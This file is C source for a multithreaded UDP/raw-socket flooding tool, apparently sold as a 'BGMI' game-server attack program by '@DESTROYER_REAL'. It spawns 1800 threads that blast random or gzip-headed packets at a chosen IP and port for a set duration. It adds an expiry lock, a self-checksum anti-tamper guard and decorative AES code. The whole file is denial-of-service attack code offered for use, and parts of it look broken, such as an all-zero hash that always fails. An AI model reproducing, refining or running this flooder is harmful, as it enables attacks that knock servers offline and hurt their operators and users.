#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define MAX_THREADS 1800
#define ORIGINAL_SHA256 "0000000000000000000000000000000000000000000000000000000000000000"
#define EXPIRY_DATE "2025-09-30"

struct thread_args {
    char ip[16];
    int port;
    int duration;
};

void print_exit_and_terminate() {
    printf("Program expired. Buy new from destroyer.\n");
    exit(EXIT_FAILURE);
}

void print_modify_warning_and_terminate() {
    printf("Deleting you can't modify code by @DESTROYER_REAL\n");
    exit(EXIT_FAILURE);
}

// Function to parse date in YYYY-MM-DD format and extract year, month, day
void parse_date(const char *date_str, int *year, int *month, int *day) {
    if (sscanf(date_str, "%4d-%2d-%2d", year, month, day) != 3) {
        printf("Invalid date format. Use YYYY-MM-DD.\n");
        exit(EXIT_FAILURE);
    }
}

int check_expiry() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    int current_year = current_time->tm_year + 1900; // Years since 1900
    int current_month = current_time->tm_mon + 1;    // Months 0-11 to 1-12
    int current_day = current_time->tm_mday;

    int expiry_year, expiry_month, expiry_day;
    parse_date(EXPIRY_DATE, &expiry_year, &expiry_month, &expiry_day);

    // Compare year, month, day
    if (current_year > expiry_year ||
        (current_year == expiry_year && current_month > expiry_month) ||
        (current_year == expiry_year && current_month == expiry_month && current_day > expiry_day)) {
        print_exit_and_terminate();
        return 1;
    }
    return 0;
}

int check_sha256_integrity(const char *filepath) {
    FILE *file = fopen(filepath, "rb");
    if (!file) {
        perror("Failed to open binary for checksum");
        return -1;
    }

    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        perror("EVP_MD_CTX_new failed");
        fclose(file);
        return -1;
    }

    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1) {
        perror("EVP_DigestInit_ex failed");
        EVP_MD_CTX_free(mdctx);
        fclose(file);
        return -1;
    }

    unsigned char buffer[4096];
    size_t read_bytes;

    while ((read_bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (EVP_DigestUpdate(mdctx, buffer, read_bytes) != 1) {
            perror("EVP_DigestUpdate failed");
            EVP_MD_CTX_free(mdctx);
            fclose(file);
            return -1;
        }
    }
    fclose(file);

    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;

    if (EVP_DigestFinal_ex(mdctx, hash, &hash_len) != 1) {
        perror("EVP_DigestFinal_ex failed");
        EVP_MD_CTX_free(mdctx);
        return -1;
    }
    EVP_MD_CTX_free(mdctx);

    char hash_string[65];
    for (unsigned int i = 0; i < hash_len; i++) {
        sprintf(hash_string + (i * 2), "%02x", hash[i]);
    }
    hash_string[64] = '\0';

    if (strcasecmp(hash_string, ORIGINAL_SHA256) != 0) {
        print_modify_warning_and_terminate();
        return -1;
    }
    return 0;
}

// Function to generate AES-256 key and IV dynamically
void generate_key_iv(unsigned char *key, unsigned char *iv) {
    const char *seed = EXPIRY_DATE "destroyer_key_seed";
    unsigned char hash[32];
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        perror("EVP_MD_CTX_new failed");
        exit(EXIT_FAILURE);
    }

    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1) {
        perror("EVP_DigestInit_ex failed");
        EVP_MD_CTX_free(mdctx);
        exit(EXIT_FAILURE);
    }

    if (EVP_DigestUpdate(mdctx, seed, strlen(seed)) != 1) {
        perror("EVP_DigestUpdate failed");
        EVP_MD_CTX_free(mdctx);
        exit(EXIT_FAILURE);
    }

    unsigned int hash_len;
    if (EVP_DigestFinal_ex(mdctx, hash, &hash_len) != 1) {
        perror("EVP_DigestFinal_ex failed");
        EVP_MD_CTX_free(mdctx);
        exit(EXIT_FAILURE);
    }
    EVP_MD_CTX_free(mdctx);

    memcpy(key, hash, 32);
    memcpy(iv, hash, 16);
}

// Function to encrypt critical code section
int encrypt_critical_section(unsigned char *plaintext, int plaintext_len, unsigned char *ciphertext, unsigned char *key, unsigned char *iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("EVP_CIPHER_CTX_new failed");
        return -1;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        perror("EVP_EncryptInit_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int len;
    int ciphertext_len;

    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        perror("EVP_EncryptUpdate failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        perror("EVP_EncryptFinal_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

// Function to decrypt critical code section
int decrypt_critical_section(unsigned char *ciphertext, int ciphertext_len, unsigned char *plaintext, unsigned char *key, unsigned char *iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("EVP_CIPHER_CTX_new failed");
        return -1;
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        perror("EVP_DecryptInit_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int len;
    int plaintext_len;

    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        perror("EVP_DecryptUpdate failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        perror("EVP_DecryptFinal_ex failed");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return plaintext_len;
}

void fill_random_hex(char *buffer, int size) {
    const char hex_chars[] = "0123456789ABCDEF";
    for (int i = 0; i < size; i++) {
        buffer[i] = hex_chars[rand() % 16];
    }
}

void fill_bgmi_payload(char *buffer, int size) {
    unsigned char bgmi_header[] = {0x1F, 0x8B, 0x08, 0x00};
    int header_size = sizeof(bgmi_header);
    if (size < header_size) size = header_size;

    memcpy(buffer, bgmi_header, header_size);
    for (int i = header_size; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

void *send_random_packets(void *arguments) {
    unsigned char key[32];
    unsigned char iv[16];
    generate_key_iv(key, iv);

    unsigned char *critical_data = (unsigned char *)"Critical packet logic";
    int critical_data_len = strlen((char *)critical_data);
    unsigned char ciphertext[256];
    unsigned char decrypted[256];
    int ciphertext_len;

    ciphertext_len = encrypt_critical_section(critical_data, critical_data_len, ciphertext, key, iv);
    if (ciphertext_len < 0) {
        perror("Encryption failed");
        pthread_exit(NULL);
    }

    int decrypted_len = decrypt_critical_section(ciphertext, ciphertext_len, decrypted, key, iv);
    if (decrypted_len < 0) {
        perror("Decryption failed");
        pthread_exit(NULL);
    }

    struct thread_args *args = (struct thread_args *)arguments;
    char *ip = args->ip;
    int port = args->port;
    int duration = args->duration;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &dest.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        pthread_exit(NULL);
    }

    time_t end_time = time(NULL) + duration;
    srand((unsigned int)(time(NULL) ^ pthread_self()));

    while (time(NULL) < end_time) {
        int payload_size = 40 + rand() % (1500 - 40 + 1);
        char *packet = malloc(payload_size);
        if (!packet) {
            perror("Malloc failed");
            break;
        }

        int payload_type = rand() % 2;

        if (payload_type == 0) {
            fill_random_hex(packet, payload_size);
        } else {
            fill_bgmi_payload(packet, payload_size);
        }

        if (sendto(sock, packet, payload_size, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Sendto failed");
            free(packet);
            break;
        }

        free(packet);
        usleep(100);
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <port> <duration>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.1 80 60\n", argv[0]);
        return 1;
    }

    // Check expiry date
    if (check_expiry()) {
        return 1;
    }

    // Check binary SHA256 integrity
    if (check_sha256_integrity(argv[0]) != 0) {
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];
    struct thread_args args[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        strncpy(args[i].ip, ip, 15);
        args[i].ip[15] = '\0';
        args[i].port = port;
        args[i].duration = duration;

        if (pthread_create(&threads[i], NULL, send_random_packets, (void *)&args[i]) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}